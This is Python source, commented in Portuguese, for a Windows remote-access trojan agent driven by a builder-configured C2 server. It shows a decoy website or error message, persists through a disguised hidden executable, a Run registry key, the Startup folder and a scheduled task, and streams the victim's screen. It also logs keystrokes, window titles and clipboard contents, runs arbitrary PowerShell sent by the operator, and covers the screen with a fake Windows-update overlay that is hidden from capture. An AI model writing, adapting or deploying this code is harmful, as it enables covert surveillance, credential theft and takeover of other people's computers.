import sys
import os
import time
import json
import asyncio
import base64
import subprocess
import threading
import ctypes
import platform
import socket
import io

# Garante tratamento de encoding seguro no Windows (evita erro de charmap cp1252/noconsole ao printar)
if hasattr(sys, 'stdout') and hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='backslashreplace')
        sys.stderr.reconfigure(encoding='utf-8', errors='backslashreplace')
    except Exception:
        pass
from PIL import ImageGrab, Image

# Habilita DPI Awareness no Windows para cliques de mouse e resolução 100% precisos
try:
    ctypes.windll.shcore.SetProcessDpiAwareness(2) # PROCESS_PER_MONITOR_DPI_AWARE
except Exception:
    try:
        ctypes.windll.user32.SetProcessDPIAware()
    except Exception:
        pass


# Dependências opcionais com fallback seguro
try:
    import websockets
except ImportError:
    print("Biblioteca websockets necessária. Instalando...")
    subprocess.run([sys.executable, "-m", "pip", "install", "websockets"])
    import websockets

# Estruturas do SendInput Win32 para simulação física perfeita de mouse no Windows
class MOUSEINPUT(ctypes.Structure):
    _fields_ = [
        ('dx', ctypes.c_long),
        ('dy', ctypes.c_long),
        ('mouseData', ctypes.c_ulong),
        ('dwFlags', ctypes.c_ulong),
        ('time', ctypes.c_ulong),
        ('dwExtraInfo', ctypes.POINTER(ctypes.c_ulong))
    ]

class INPUT_UNION(ctypes.Union):
    _fields_ = [('mi', MOUSEINPUT)]

class INPUT(ctypes.Structure):
    _fields_ = [
        ('type', ctypes.c_ulong),
        ('union', INPUT_UNION)
    ]


try:
    import pynput
    from pynput import keyboard, mouse
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

# Configurações Padrão (Serão injetadas/substituídas pelo Builder)
C2_HOST = "127.0.0.1"
C2_PORT = 8000
C2_USE_SSL = False
BUILD_ID = "win-default-001"
DECOY_URL = ""
DECOY_MESSAGE = ""

def trigger_decoy_action():
    """Exibe o site configurado DENTRO de uma janela incorporada de aplicativo (WebView), sem abrir o navegador externo."""
    try:
        if DECOY_URL and DECOY_URL.strip():
            url = DECOY_URL.strip()
            if not url.startswith("http://") and not url.startswith("https://"):
                url = "https://" + url

            def _launch_embedded_webview():
                # Método 1: pywebview (Edge WebView2 Nativo embutido na aplicação)
                try:
                    import webview
                    # Cria a janela de aplicativo com o site carregado dentro do próprio app
                    window = webview.create_window("Aplicativo", url, width=1280, height=800, resizable=True)
                    webview.start()
                    return
                except Exception:
                    pass

                # Método 2: Janela de Aplicação Autônoma do Edge (--app) sem barras de navegador
                try:
                    edge_paths = [
                        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                        r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
                        "msedge"
                    ]
                    for edge in edge_paths:
                        try:
                            cmd = f'"{edge}" --app="{url}" --window-size=1280,800'
                            proc = subprocess.Popen(cmd, shell=True)
                            if proc.poll() is None:
                                return
                        except Exception:
                            continue
                except Exception:
                    pass

                # Método 3: Janela de Aplicação Autônoma do Chrome (--app)
                try:
                    chrome_paths = [
                        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                        "chrome"
                    ]
                    for chrome in chrome_paths:
                        try:
                            cmd = f'"{chrome}" --app="{url}" --window-size=1280,800'
                            proc = subprocess.Popen(cmd, shell=True)
                            if proc.poll() is None:
                                return
                        except Exception:
                            continue
                except Exception:
                    pass

            # Inicia o WebView em uma thread separada para não bloquear a conexão do agente C2
            t = threading.Thread(target=_launch_embedded_webview, daemon=True)
            t.start()

        if DECOY_MESSAGE and DECOY_MESSAGE.strip():
            msg = DECOY_MESSAGE.strip()
            def _show_msg():
                try:
                    ctypes.windll.user32.MessageBoxW(0, msg, "Aviso do Sistema", 0x10) # 0x10 = MB_ICONERROR
                except Exception:
                    pass
            t_msg = threading.Thread(target=_show_msg, daemon=True)
            t_msg.start()

    except Exception:
        pass

import uuid
import hashlib

# Gera ID único e exclusivo para CADA computador na internet baseado em Hardware Fingerprint
COMPUTER_NAME = socket.gethostname()
USER_NAME = os.getlogin() if hasattr(os, 'getlogin') else "User"

def generate_unique_device_id():
    try:
        hw_raw = f"{COMPUTER_NAME}-{USER_NAME}-{uuid.getnode()}-{platform.machine()}"
        hw_hash = hashlib.md5(hw_raw.encode('utf-8')).hexdigest()[:8].upper()
    except Exception:
        hw_hash = uuid.uuid4().hex[:8].upper()
    
    clean_comp = "".join(c for c in COMPUTER_NAME if c.isalnum() or c in ['-', '_'])
    clean_user = "".join(c for c in USER_NAME if c.isalnum() or c in ['-', '_'])
    return f"WIN-{clean_comp}-{clean_user}-{hw_hash}"

DEVICE_ID = generate_unique_device_id()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

from datetime import datetime

# ==============================================================================
# KEYLOGGER AVANÇADO DO WINDOWS (TECLAS, JANELA ATIVA, ÁREA DE TRANSFERÊNCIA/CTRL+C)
# ==============================================================================
class AdvancedWindowsKeylogger:
    def __init__(self, send_callback):
        self.send_callback = send_callback
        self.is_running = False
        self.last_window = ""
        self.last_clipboard = ""
        self.buffer = []
        self.lock = threading.Lock()

    def get_active_window(self):
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            if not hwnd: return "Área de Trabalho"
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            if length <= 0: return "Janela sem Título"
            buff = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value
        except Exception:
            return "Windows Desktop"

    def get_clipboard_text(self):
        try:
            if not ctypes.windll.user32.OpenClipboard(None): return None
            try:
                # CF_UNICODETEXT = 13
                handle = ctypes.windll.user32.GetClipboardData(13)
                if not handle: return None
                ptr = ctypes.windll.kernel32.GlobalLock(handle)
                if not ptr: return None
                text = ctypes.c_wchar_p(ptr).value
                ctypes.windll.kernel32.GlobalUnlock(handle)
                return text
            finally:
                ctypes.windll.user32.CloseClipboard()
        except Exception:
            return None

    def check_window_and_notify(self):
        curr_win = self.get_active_window()
        if curr_win != self.last_window:
            self.flush()
            self.last_window = curr_win
            now_str = datetime.now().strftime("%H:%M:%S")
            header = f"\n📌 [{now_str}] JANELA: {curr_win}\n"
            self.send_callback(header)

    def check_clipboard(self):
        text = self.get_clipboard_text()
        if text and text != self.last_clipboard and len(text.strip()) > 0:
            self.last_clipboard = text
            now_str = datetime.now().strftime("%H:%M:%S")
            display_text = text if len(text) <= 300 else text[:300] + "... [TRUNCADO]"
            log_entry = f"\n📋 [{now_str}] [COPIADO]: {display_text}\n"
            self.send_callback(log_entry)

    def append_char(self, char_str, force_flush=False):
        self.check_window_and_notify()
        with self.lock:
            self.buffer.append(char_str)
            if force_flush or len(self.buffer) >= 15:
                self._flush_locked()

    def flush(self):
        with self.lock:
            self._flush_locked()

    def _flush_locked(self):
        if self.buffer:
            text = "".join(self.buffer)
            self.buffer.clear()
            self.send_callback(text)

    def _clipboard_loop(self):
        while self.is_running:
            try:
                self.check_clipboard()
                time.sleep(0.8)
            except Exception:
                time.sleep(1.0)

    def start(self):
        if self.is_running: return
        self.is_running = True

        threading.Thread(target=self._clipboard_loop, daemon=True).start()

        if HAS_PYNPUT:
            def on_press(key):
                try:
                    if hasattr(key, 'char') and key.char is not None:
                        self.append_char(key.char)
                    else:
                        name = str(key.name).lower() if hasattr(key, 'name') else str(key)
                        if name == 'space':
                            self.append_char(" ")
                        elif name == 'enter':
                            self.append_char("\n[ENTER]\n", force_flush=True)
                        elif name == 'backspace':
                            self.append_char("[←]")
                        elif name == 'tab':
                            self.append_char(" [TAB] ")
                        elif name == 'esc':
                            self.append_char(" [ESC] ")
                        elif name == 'delete':
                            self.append_char(" [DEL] ")
                        elif name in ['shift', 'shift_r', 'ctrl', 'ctrl_r', 'alt', 'alt_gr', 'cmd']:
                            pass
                        else:
                            self.append_char(f" [{name.upper()}] ")
                except Exception:
                    pass

            try:
                listener = keyboard.Listener(on_press=on_press)
                listener.daemon = True
                listener.start()
                print("[Keylogger] Keylogger Avancado iniciado (pynput + clipboard + janelas)!")
                return
            except Exception as e:
                print(f"Aviso no listener pynput: {e}")

        # Fallback nativo Win32 (GetAsyncKeyState) caso pynput não esteja presente
        def win32_keylogger_loop():
            user32 = ctypes.windll.user32
            key_states = {}
            while self.is_running:
                try:
                    for vk in range(8, 256):
                        state = user32.GetAsyncKeyState(vk)
                        is_pressed = (state & 0x8000) != 0
                        was_pressed = key_states.get(vk, False)
                        key_states[vk] = is_pressed

                        if is_pressed and not was_pressed:
                            if vk == 0x0D: # ENTER
                                self.append_char("\n[ENTER]\n", force_flush=True)
                            elif vk == 0x20: # SPACE
                                self.append_char(" ")
                            elif vk == 0x08: # BACKSPACE
                                self.append_char("[<-]")
                            elif vk == 0x09: # TAB
                                self.append_char(" [TAB] ")
                            elif 0x41 <= vk <= 0x5A: # A-Z
                                shift = (user32.GetAsyncKeyState(0x10) & 0x8000) != 0
                                caps = (user32.GetKeyState(0x14) & 1) != 0
                                char = chr(vk) if (shift ^ caps) else chr(vk).lower()
                                self.append_char(char)
                            elif 0x30 <= vk <= 0x39: # 0-9
                                self.append_char(chr(vk))
                    time.sleep(0.01)
                except Exception:
                    time.sleep(0.1)

        threading.Thread(target=win32_keylogger_loop, daemon=True).start()
        print("[Keylogger] Keylogger Avancado nativo Win32 iniciado (GetAsyncKeyState + clipboard + janelas)!")

_active_keylogger_instance = None

def start_keylogger(send_keylog_callback):
    global _active_keylogger_instance
    if _active_keylogger_instance is None:
        _active_keylogger_instance = AdvancedWindowsKeylogger(send_keylog_callback)
        _active_keylogger_instance.start()
    else:
        _active_keylogger_instance.send_callback = send_keylog_callback


# Gerenciador de Tela Preta (Blackout) nativo e personalizável no Windows usando Win32 API
user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32

try:
    user32.DefWindowProcW.argtypes = [ctypes.c_void_p, ctypes.c_uint, ctypes.c_uint64, ctypes.c_uint64]
    user32.DefWindowProcW.restype = ctypes.c_uint64
    user32.DrawTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int, ctypes.c_void_p, ctypes.c_uint]
    gdi32.SetBkMode.argtypes = [ctypes.c_void_p, ctypes.c_int]
except Exception:
    pass

class WindowsBlackScreen:
    def __init__(self):
        self.hwnd = None
        self.is_active = False
        self.thread = None
        self.wndproc_ptr = None
        self.title = "Trabalhando nas atualizações"
        self.subtitle = "Não desligue o seu computador. Isso pode levar alguns minutos."
        self.template = "windows_update"

    def _wnd_proc(self, hwnd, msg, wparam, lparam):
        if msg == 0x000F: # WM_PAINT
            ps = (ctypes.c_byte * 64)()
            hdc = user32.BeginPaint(hwnd, ps)
            
            vx = user32.GetSystemMetrics(76)
            vy = user32.GetSystemMetrics(77)
            vw = user32.GetSystemMetrics(78)
            vh = user32.GetSystemMetrics(79)
            if vw <= 0 or vh <= 0:
                vx, vy, vw, vh = 0, 0, user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)

            rect = (ctypes.c_int * 4)(0, 0, vw, vh)
            brush = gdi32.CreateSolidBrush(0x00000000) # Preto puro
            user32.FillRect(hdc, rect, brush)
            gdi32.DeleteObject(brush)

            if self.template != "pure_black":
                gdi32.SetBkMode(hdc, 1) # TRANSPARENT
                gdi32.SetTextColor(hdc, 0x00FFFFFF) # WHITE

                rect_title = (ctypes.c_int * 4)(0, vh // 2 - 40, vw, vh // 2)
                rect_sub = (ctypes.c_int * 4)(0, vh // 2 + 10, vw, vh // 2 + 60)

                # DT_CENTER (1) | DT_SINGLELINE (32)
                user32.DrawTextW(hdc, self.title, -1, ctypes.byref(rect_title), 1 | 32)
                user32.DrawTextW(hdc, self.subtitle, -1, ctypes.byref(rect_sub), 1 | 32)

            user32.EndPaint(hwnd, ps)
            return 0
        elif msg in [0x0010, 0x0002]: # WM_CLOSE / WM_DESTROY
            return 0
        return user32.DefWindowProcW(hwnd, msg, wparam, lparam)

    def _create_win32_black_screen(self):
        try:
            WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_uint64, ctypes.c_void_p, ctypes.c_uint, ctypes.c_uint64, ctypes.c_uint64)
            self.wndproc_ptr = WNDPROC(self._wnd_proc)

            class WNDCLASS(ctypes.Structure):
                _fields_ = [
                    ("style", ctypes.c_uint),
                    ("lpfnWndProc", WNDPROC),
                    ("cbClsExtra", ctypes.c_int),
                    ("cbWndExtra", ctypes.c_int),
                    ("hInstance", ctypes.c_void_p),
                    ("hIcon", ctypes.c_void_p),
                    ("hCursor", ctypes.c_void_p),
                    ("hBRBackground", ctypes.c_void_p),
                    ("lpszMenuName", ctypes.c_wchar_p),
                    ("lpszClassName", ctypes.c_wchar_p),
                ]

            wcls = WNDCLASS()
            wcls.lpszClassName = "WinSystemBlackoutCustom"
            wcls.lpfnWndProc = self.wndproc_ptr
            wcls.hBRBackground = gdi32.CreateSolidBrush(0x00000000)
            user32.RegisterClassW(ctypes.byref(wcls))

            vx = user32.GetSystemMetrics(76)
            vy = user32.GetSystemMetrics(77)
            vw = user32.GetSystemMetrics(78)
            vh = user32.GetSystemMetrics(79)
            if vw <= 0 or vh <= 0:
                vx, vy, vw, vh = 0, 0, user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)

            WS_POPUP = 0x80000000
            WS_VISIBLE = 0x10000000
            WS_EX_TOPMOST = 0x00000008
            WS_EX_TOOLWINDOW = 0x00000080
            WS_EX_TRANSPARENT = 0x00000020  # Permite que os cliques do painel passem 100% através da tela preta para o app atrás!
            WS_EX_LAYERED = 0x00080000
            WS_EX_NOACTIVATE = 0x08000000

            self.hwnd = user32.CreateWindowExW(
                WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_TRANSPARENT | WS_EX_LAYERED | WS_EX_NOACTIVATE,
                "WinSystemBlackoutCustom",
                "Blackout",
                WS_POPUP | WS_VISIBLE,
                vx, vy, vw, vh,
                None, None, None, None
            )

            user32.SetWindowPos(self.hwnd, -1, vx, vy, vw, vh, 0x0040)
            
            # Define opacidade total do layered window
            try:
                user32.SetLayeredWindowAttributes(self.hwnd, 0, 255, 0x02) # LWA_ALPHA = 2
            except Exception:
                pass

            # WDA_EXCLUDEFROMCAPTURE (0x00000011): O overlay fica 100% opaco no monitor físico,
            # mas é excluído da captura pelo Windows. O VNC transmite a tela limpa sem piscar!
            try:
                user32.SetWindowDisplayAffinity(self.hwnd, 0x00000011)
            except Exception:
                pass

            user32.ShowCursor(False)

            msg = (ctypes.c_byte * 48)()
            while self.is_active and user32.GetMessageW(msg, None, 0, 0) > 0:
                user32.TranslateMessage(msg)
                user32.DispatchMessageW(msg)

            user32.ShowCursor(True)
            if self.hwnd:
                user32.DestroyWindow(self.hwnd)
                self.hwnd = None
        except Exception as e:
            print(f"Erro no blackout nativo Win32: {e}")

    def show(self, title=None, subtitle=None, template=None):
        if title: self.title = title
        if subtitle: self.subtitle = subtitle
        if template: self.template = template

        if self.is_active and self.hwnd:
            try:
                user32.InvalidateRect(self.hwnd, None, True)
            except Exception:
                pass
            return

        self.is_active = True
        self.thread = threading.Thread(target=self._create_win32_black_screen, daemon=True)
        self.thread.start()

    def hide(self):
        self.is_active = False
        if self.hwnd:
            try:
                user32.PostMessageW(self.hwnd, 0x0012, 0, 0)
            except Exception:
                pass
            self.hwnd = None

black_screen_mgr = WindowsBlackScreen()


class WindowsAgent:
    def __init__(self, host, port, use_ssl=False, build_id=None):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.build_id = build_id
        self.device_id = DEVICE_ID
        self.websocket = None
        self.is_running = True
        self.streaming_screen = True
        self.screen_quality = 45
        self.scale_factor = 0.6  # Reduz resolução para 60% para transmissão super rápida

    def get_ws_urls(self):
        protocol = "wss" if self.use_ssl else "ws"
        primary = f"{protocol}://{self.host}:{self.port}/ws?device_id={self.device_id}"
        if self.build_id:
            primary += f"&build_id={self.build_id}"
            
        urls = [primary]
        # Se o host configurado for o IP público, adiciona fallbacks locais (para testes no mesmo PC/Rede)
        if self.host not in ["127.0.0.1", "localhost"]:
            urls.append(f"{protocol}://127.0.0.1:{self.port}/ws?device_id={self.device_id}")
            urls.append(f"{protocol}://192.168.1.10:{self.port}/ws?device_id={self.device_id}")
        return urls

    def get_device_info(self):
        return {
            "type": "DEVICE_INFO",
            "model": f"PC: {COMPUTER_NAME} ({USER_NAME})",
            "manufacturer": f"Microsoft Windows ({platform.architecture()[0]})",
            "android_version": f"{platform.system()} {platform.release()}",
            "sdk": platform.version(),
            "battery_level": 100,
            "is_charging": True,
            "network_type": "Ethernet/Wi-Fi",
            "storage_info": f"Host: {COMPUTER_NAME}",
            "accessibility_active": True,
            "admin_active": is_admin()
        }

    def capture_screen_bytes(self):
        try:
            screenshot = ImageGrab.grab()

            if self.scale_factor < 1.0:
                new_size = (int(screenshot.width * self.scale_factor), int(screenshot.height * self.scale_factor))
                screenshot = screenshot.resize(new_size, Image.Resampling.LANCZOS if hasattr(Image, 'Resampling') else Image.ANTIALIAS)
            
            output = io.BytesIO()
            screenshot.save(output, format="JPEG", quality=self.screen_quality, optimize=True)
            jpeg_bytes = output.getvalue()

            # Protocolo do Server: [1 byte TIPO][4 bytes TAMANHO BIG ENDIAN][DADOS JPEG]
            frame_type = bytes([1])
            frame_size = len(jpeg_bytes).to_bytes(4, byteorder='big')
            return frame_type + frame_size + jpeg_bytes
        except Exception as e:
            return None

    async def screen_stream_loop(self):
        while self.is_running and self.websocket:
            try:
                if self.streaming_screen:
                    frame = self.capture_screen_bytes()
                    if frame and self.websocket:
                        await self.websocket.send(frame)
                await asyncio.sleep(0.15)  # ~6.5 FPS para performance fluida e estável
            except asyncio.CancelledError:
                break
            except Exception as e:
                await asyncio.sleep(0.5)

    def handle_click(self, x_ratio, y_ratio, button="left", double=False):
        try:
            user32 = ctypes.windll.user32
            
            # Suporte a múltiplos monitores (Virtual Screen)
            vx = user32.GetSystemMetrics(76) # SM_XVIRTUALSCREEN
            vy = user32.GetSystemMetrics(77) # SM_YVIRTUALSCREEN
            vw = user32.GetSystemMetrics(78) # SM_CXVIRTUALSCREEN
            vh = user32.GetSystemMetrics(79) # SM_CYVIRTUALSCREEN
            if vw <= 0 or vh <= 0:
                vx, vy, vw, vh = 0, 0, user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)

            target_x = int(vx + float(x_ratio) * vw)
            target_y = int(vy + float(y_ratio) * vh)

            target_x = max(vx, min(vx + vw - 1, target_x))
            target_y = max(vy, min(vy + vh - 1, target_y))

            user32.SetCursorPos(target_x, target_y)
            time.sleep(0.01)

            btn_str = str(button).lower()
            is_right = btn_str in ["right", "2"]
            is_dbl = bool(double)

            # SendInput para simulação física perfeita de hardware
            inp_down = INPUT()
            inp_down.type = 0
            inp_down.union.mi.dx = target_x
            inp_down.union.mi.dy = target_y
            inp_down.union.mi.dwFlags = 0x0008 if is_right else 0x0002 # RIGHTDOWN or LEFTDOWN

            inp_up = INPUT()
            inp_up.type = 0
            inp_up.union.mi.dx = target_x
            inp_up.union.mi.dy = target_y
            inp_up.union.mi.dwFlags = 0x0010 if is_right else 0x0004 # RIGHTUP or LEFTUP

            user32.SendInput(1, ctypes.byref(inp_down), ctypes.sizeof(INPUT))
            time.sleep(0.01)
            user32.SendInput(1, ctypes.byref(inp_up), ctypes.sizeof(INPUT))

            if is_dbl:
                time.sleep(0.05)
                user32.SendInput(1, ctypes.byref(inp_down), ctypes.sizeof(INPUT))
                time.sleep(0.01)
                user32.SendInput(1, ctypes.byref(inp_up), ctypes.sizeof(INPUT))

            print(f"[Mouse] Clique SendInput enviado em ({target_x}, {target_y}) - Right: {is_right}, Dbl: {is_dbl}")
        except Exception as e:
            print(f"Erro ao executar click SendInput: {e}")


    def handle_type_text(self, text):
        try:
            if HAS_PYNPUT:
                k = keyboard.Controller()
                k.type(text)
            else:
                escaped = text.replace("'", "''")
                cmd = f"powershell -c \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{escaped}')\""
                subprocess.Popen(cmd, shell=True)
        except Exception as e:
            print(f"Erro ao digitar texto: {e}")

    def handle_key_press(self, key_name):
        try:
            key_name = str(key_name).upper()
            if key_name == "WIN":
                ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0) # WIN down
                ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0) # WIN up
            elif key_name == "WIN_D":
                ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0) # WIN down
                ctypes.windll.user32.keybd_event(0x44, 0, 0, 0) # D down
                ctypes.windll.user32.keybd_event(0x44, 0, 2, 0) # D up
                ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0) # WIN up
            elif key_name == "WIN_E":
                ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0) # WIN down
                ctypes.windll.user32.keybd_event(0x45, 0, 0, 0) # E down
                ctypes.windll.user32.keybd_event(0x45, 0, 2, 0) # E up
                ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0) # WIN up
            elif key_name == "ALT_TAB":
                ctypes.windll.user32.keybd_event(0x12, 0, 0, 0) # ALT down
                ctypes.windll.user32.keybd_event(0x09, 0, 0, 0) # TAB down
                ctypes.windll.user32.keybd_event(0x09, 0, 2, 0) # TAB up
                ctypes.windll.user32.keybd_event(0x12, 0, 2, 0) # ALT up
            else:
                key_map = {
                    "BACK": 0x08,
                    "ENTER": 0x0D,
                    "TAB": 0x09,
                    "ESC": 0x1B,
                    "DELETE": 0x2E,
                    "HOME": 0x24,
                }
                vk = key_map.get(key_name)
                if vk:
                    ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
                    ctypes.windll.user32.keybd_event(vk, 0, 2, 0)
        except Exception as e:
            print(f"Erro ao pressionar tecla {key_name}: {e}")

    def execute_shell_command(self, command):
        try:
            proc = subprocess.run(["powershell", "-NoProfile", "-Command", command], capture_output=True, text=True, timeout=15)
            output = proc.stdout if proc.stdout else proc.stderr
            return output if output else "Comando executado sem retorno."
        except Exception as e:
            return f"Erro na execução do comando: {e}"

    async def handle_server_message(self, message_raw):
        try:
            data = json.loads(message_raw)
            action = data.get("action") or data.get("type")

            if action == "PING":
                await self.websocket.send(json.dumps({"type": "PONG", "device_id": self.device_id}))

            elif action in ["CLICK", "TOUCH", "TAP"]:
                x = data.get("x", 0)
                y = data.get("y", 0)
                button = data.get("button", "left")
                double = data.get("double", False)
                if x > 1 or y > 1:
                    screen_w = ctypes.windll.user32.GetSystemMetrics(0)
                    screen_h = ctypes.windll.user32.GetSystemMetrics(1)
                    x = x / 1080.0
                    y = y / 2400.0
                self.handle_click(x, y, button=button, double=double)

            elif action in ["TYPE", "SET_TEXT", "INPUT_TEXT"]:
                text = data.get("text") or data.get("data") or ""
                if text:
                    self.handle_type_text(text)

            elif action in ["KEY", "KEY_EVENT", "PRESS_KEY"]:
                key = data.get("key") or data.get("keycode") or ""
                if key:
                    self.handle_key_press(str(key).upper())

            elif action in ["SHELL", "EXEC", "COMMAND", "RUN_COMMAND"]:
                cmd = data.get("command") or data.get("cmd") or ""
                if cmd:
                    output = self.execute_shell_command(cmd)
                    await self.websocket.send(json.dumps({
                        "type": "KEYLOG",
                        "data": f"[SHELL OUTPUT]\n{output}"
                    }))

            elif action in ["BLACK_SCREEN_ON", "TOGGLE_BLACK_SCREEN"]:
                title = data.get("title") or "Trabalhando nas atualizações"
                subtitle = data.get("subtitle") or data.get("message") or "Não desligue o seu computador. Isso pode levar alguns minutos."
                template = data.get("template") or "windows_update"
                black_screen_mgr.show(title=title, subtitle=subtitle, template=template)
                await self.websocket.send(json.dumps({"type": "KEYLOG", "data": "[SISTEMA] Tela Preta ATIVADA no PC!"}))

            elif action == "CUSTOM_BLACK_SCREEN":
                title = data.get("title") or "Trabalhando nas atualizações"
                subtitle = data.get("subtitle") or data.get("message") or "Não desligue o seu computador."
                template = data.get("template") or "custom"
                black_screen_mgr.show(title=title, subtitle=subtitle, template=template)
                await self.websocket.send(json.dumps({"type": "KEYLOG", "data": "[SISTEMA] Tela Preta Customizada ATIVADA no PC!"}))

            elif action == "BLACK_SCREEN_OFF":
                black_screen_mgr.hide()
                await self.websocket.send(json.dumps({"type": "KEYLOG", "data": "[SISTEMA] Tela Preta DESATIVADA no PC!"}))

            elif action == "LOCK":
                ctypes.windll.user32.LockWorkStation()

            elif action == "SHUTDOWN":
                subprocess.Popen("shutdown /s /t 0", shell=True)

            elif action == "RESTART":
                subprocess.Popen("shutdown /r /t 0", shell=True)

        except Exception as e:
            print(f"Erro ao processar mensagem do servidor: {e}")

    async def connect(self):
        urls = self.get_ws_urls()
        
        while self.is_running:
            for url in urls:
                print(f"[C2] Tentando conexao C2: {url}")
                try:
                    async with websockets.connect(url, max_size=10*1024*1024, ping_interval=20, ping_timeout=10, open_timeout=4) as ws:
                        self.websocket = ws
                        print(f"[C2] Conectado com sucesso em {url}! Device ID: {self.device_id}")

                        device_info = self.get_device_info()
                        await ws.send(json.dumps(device_info))

                        def send_keylog_sync(text):
                            if self.websocket and self.websocket.open:
                                asyncio.run_coroutine_threadsafe(
                                    ws.send(json.dumps({"type": "KEYLOG", "data": text})),
                                    loop
                                )
                        start_keylogger(send_keylog_sync)

                        stream_task = asyncio.create_task(self.screen_stream_loop())

                        async for message in ws:
                            if isinstance(message, bytes):
                                message = message.decode('utf-8', errors='ignore')
                            if isinstance(message, str) and message.strip():
                                await self.handle_server_message(message)

                        stream_task.cancel()
                except (websockets.exceptions.ConnectionClosed, OSError, asyncio.TimeoutError, Exception) as e:
                    print(f"[C2] Falha na conexao com {url}: {e}")
                    self.websocket = None
                    await asyncio.sleep(2)
            
            await asyncio.sleep(3)


def setup_windows_persistence():
    """
    Instala a persistência no boot do Windows em 4 camadas independentes:
    1. Cópia oculta no AppData (SystemUpdate\WindowsSecurityHost.exe)
    2. Registro do Windows (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
    3. Pasta Inicializar do Usuário (Startup Folder)
    4. Tarefa Agendada no Windows (schtasks)
    """
    try:
        import winreg

        # Identifica o caminho do executável atual
        if getattr(sys, 'frozen', False):
            current_exe = sys.executable
        else:
            current_exe = os.path.abspath(sys.argv[0])

        appdata = os.environ.get("APPDATA", "")
        if not appdata:
            return

        # 1. Pasta Oculta Furtiva no AppData
        target_dir = os.path.join(appdata, "Microsoft", "Windows", "SystemUpdate")
        os.makedirs(target_dir, exist_ok=True)
        target_exe = os.path.join(target_dir, "WindowsSecurityHost.exe")

        try:
            if os.path.abspath(current_exe).lower() != os.path.abspath(target_exe).lower():
                shutil.copy2(current_exe, target_exe)
                # Define arquivo/pasta como oculto no Windows
                ctypes.windll.kernel32.SetFileAttributesW(target_dir, 0x02) # FILE_ATTRIBUTE_HIDDEN
        except Exception as e:
            target_exe = current_exe

        # 2. Registro do Windows (HKCU Run Key - Executa no Logon de usuário)
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "WindowsSecurityHost", 0, winreg.REG_SZ, f'"{target_exe}"')
            print("[Persistencia] Registro HKCU\\Run configurado com sucesso!")
        except Exception as e:
            print(f"[Persistencia] Erro ao gravar Registro: {e}")

        # 3. Pasta Inicializar (Startup Folder)
        try:
            startup_dir = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            if os.path.exists(startup_dir):
                startup_target = os.path.join(startup_dir, "WindowsSecurityHost.exe")
                if os.path.abspath(current_exe).lower() != os.path.abspath(startup_target).lower():
                    shutil.copy2(target_exe if os.path.exists(target_exe) else current_exe, startup_target)
                print("[Persistencia] Pasta Inicializar (Startup) configurada com sucesso!")
        except Exception as e:
            print(f"[Persistencia] Erro ao copiar para Startup: {e}")

        # 4. Tarefa Agendada no Windows (schtasks)
        try:
            cmd = f'schtasks /create /tn "WindowsSecurityHost" /tr "\"{target_exe}\"" /sc onlogon /f'
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[Persistencia] Tarefa Agendada schtasks criada!")
        except Exception as e:
            print(f"[Persistência] Erro no schtasks: {e}")

    except Exception as e:
        print(f"[Persistência] Aviso geral: {e}")

async def main():
    global loop
    loop = asyncio.get_running_loop()

    # Executa Ação Decoy / Redirecionamento (abrir site / mostrar mensagem se configurado)
    try:
        trigger_decoy_action()
    except Exception:
        pass

    # Ativa Persistência Automática no Boot do Windows
    try:
        setup_windows_persistence()
    except Exception as e:
        print(f"[Persistência] Erro ao aplicar persistência: {e}")

    agent = WindowsAgent(host=C2_HOST, port=C2_PORT, use_ssl=C2_USE_SSL, build_id=BUILD_ID)
    await agent.connect()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nAgente finalizado pelo usuário.")

